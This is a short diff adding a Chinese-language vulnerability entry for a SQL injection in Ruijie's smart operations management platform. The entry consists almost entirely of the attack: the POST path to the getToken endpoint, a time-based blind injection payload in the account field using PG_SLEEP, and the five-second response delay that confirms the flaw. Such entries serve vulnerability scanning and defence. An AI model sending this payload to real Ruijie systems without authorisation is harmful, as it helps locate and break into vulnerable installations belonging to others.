@@ -1,0 +1,10 @@
+# 锐捷乐享智能运维管理平台getToken存在SQL注入漏洞
+
+锐捷 ｜ SQL注入 ｜ —
+- **请求**：`POST /auth-ui/v1/api/user/token/getToken HTTP/1.1`
+
+**Payload**
+```
+account=admin');SELECT PG_SLEEP(5)--&password=6e0f9e14344c5406a0cf5a3b4dfb665f87f4a771a31f7edbb5c72874a32b2957
+```
+- **响应特征**：200 响应时间>=5s
